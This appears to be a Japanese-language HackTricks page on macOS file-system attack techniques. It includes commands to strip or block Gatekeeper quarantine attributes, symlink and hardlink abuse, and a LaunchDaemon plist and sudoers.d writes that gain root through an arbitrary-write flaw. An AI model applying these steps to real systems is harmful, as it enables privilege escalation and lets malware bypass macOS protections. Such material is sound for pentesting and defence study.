# macOS FS Tricks

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksに会社の広告を掲載**したいですか？または、**PEASSの最新バージョンにアクセス**したり、**HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのコツを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。**

</details>

## POSIX権限の組み合わせ

**ディレクトリ**内の権限：

* **読み取り** - ディレクトリエントリを**列挙**できます。
* **書き込み** - ディレクトリ内で**ファイルを削除/書き込み**でき、**空のフォルダを削除**できます。
* ただし、その上に書き込み権限がない限り、**空でないフォルダを削除/変更することはできません**。
* 所有していない限り、**フォルダの名前を変更することはできません**。
* **実行** - ディレクトリを**通過することが許可**されています - この権利がない場合、その中のファイルやサブディレクトリのファイルにアクセスすることはできません。

### 危険な組み合わせ

**rootが所有するファイル/フォルダを上書きする方法**ですが：

* パス内の1つの親**ディレクトリの所有者**がユーザーです。
* パス内の1つの親**ディレクトリの所有者**が**書き込みアクセス**を持つ**ユーザーグループ**です。
* ユーザー**グループ**が**ファイル**に**書き込み**アクセス権を持っています。

これらの組み合わせのいずれかで、攻撃者は特権的な任意の書き込みを得るために、予想されるパスに**シム/ハードリンク**を**注入**することができます。

### フォルダroot R+Xの特別なケース

**rootのみがR+Xアクセス**を持つ**ディレクトリ**内のファイルは、他の誰にも**アクセスできません**。そのため、ユーザーが読むことができるが、その**制限**のために読むことができないファイルを、このフォルダから**別のフォルダに移動**することを可能にする脆弱性を悪用すると、これらのファイルを読むことができます。

例：[https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## シンボリックリンク / ハードリンク

特権プロセスが、**低権限のユーザー**によって**制御**される可能性のある**ファイル**にデータを書き込んでいる場合、または低権限のユーザーによって**事前に作成**された可能性がある場合。ユーザーは、シンボリックリンクまたはハードリンクを介して別のファイルを**指す**ことができ、特権プロセスはそのファイルに書き込むことになります。

他のセクションで、攻撃者が**特権昇格のために任意の書き込みを悪用する**方法を確認してください。

## .fileloc

**`.fileloc`** 拡張子を持つファイルは、他のアプリケーションやバイナリを指すことができるため、開かれたときに実行されるのはそのアプリケーション/バイナリになります。
例：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 任意のFD

**高い権限を持つファイルやフォルダをプロセスが開くことができれば**、**`crontab`** を悪用して **`EDITOR=exploit.py`** として `/etc/sudoers.d` 内のファイルを開くことができます。そうすると `exploit.py` は `/etc/sudoers` 内のファイルへのFDを取得し、それを悪用することができます。

例えば: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## カルテンタイン xattrs トリックを避ける

### それを削除する
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable フラグ

ファイル/フォルダにこのイミュータブル属性がある場合、xattrを設定することはできません
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs マウント

**devfs** マウントは **xattrをサポートしていません**。詳細は [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) を参照してください。
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

このACLはファイルに`xattrs`を追加することを防ぎます。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** ファイル形式は、ファイルとそのACEを含むコピーを作成します。

[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) によると、**`com.apple.acl.text`** と呼ばれるxattr内に保存されているACLのテキスト表現が、解凍されたファイルのACLとして設定されることがわかります。したがって、他のxattrsが書き込まれることを防ぐACLを持つアプリケーションを **AppleDouble** ファイル形式でzipファイルに圧縮した場合... アプリケーションに検疫xattrが設定されていませんでした：

詳細については、[**オリジナルのレポート**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) を確認してください。

これを再現するにはまず、正しいacl文字列を取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

特に必要ではありませんが、念のために残しておきます：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## コード署名のバイパス

バンドルには、バンドル内のすべての**ファイル**の**ハッシュ**を含むファイル **`_CodeSignature/CodeResources`** が含まれています。CodeResourcesのハッシュも**実行可能ファイル**に**埋め込まれている**ので、それをいじることはできません。

しかし、署名がチェックされないファイルもあります。これらはplist内でomitキーを持っています。例えば：
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
リソースのシグネチャをCLIから計算することが可能です:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## DMGをマウントする

ユーザーは、既存のフォルダの上にカスタムDMGを作成してマウントすることができます。以下はカスタムコンテンツを含むカスタムDMGパッケージを作成する方法です：

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## 任意の書き込み

### 定期的なshスクリプト

スクリプトが**シェルスクリプト**として解釈される場合、毎日実行される**`/etc/periodic/daily/999.local`** シェルスクリプトを上書きできます。

このスクリプトの実行を**偽装**するには、次のコマンドを使用します: **`sudo periodic daily`**

### デーモン

任意のスクリプトを実行するplistとして、**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** のような任意の**LaunchDaemon**を書き込みます。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
```
スクリプト `/Applications/Scripts/privesc.sh` を生成し、rootとして実行したい**コマンド**を記述します。

### Sudoersファイル

**任意の書き込み**権限がある場合、**`/etc/sudoers.d/`** フォルダ内にファイルを作成し、自分自身に**sudo**権限を付与することができます。

### PATHファイル

**`/etc/paths`** ファイルは、PATH環境変数を設定する主要な場所の一つです。これを上書きするにはroot権限が必要ですが、**特権プロセス**のスクリプトが**完全なパスなしでコマンドを実行している**場合、このファイルを変更することで**ハイジャック**することができるかもしれません。

&#x20;また、**`/etc/paths.d`** にファイルを書き込むことで、新しいフォルダを`PATH`環境変数に読み込ませることができます。

## 参考文献

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社の広告を掲載**したいですか？または、**最新版のPEASSを入手**したり、HackTricksをPDFで**ダウンロード**したいですか？ [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**に**フォローしてください。
* **ハッキングのコツを共有するために、** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
```
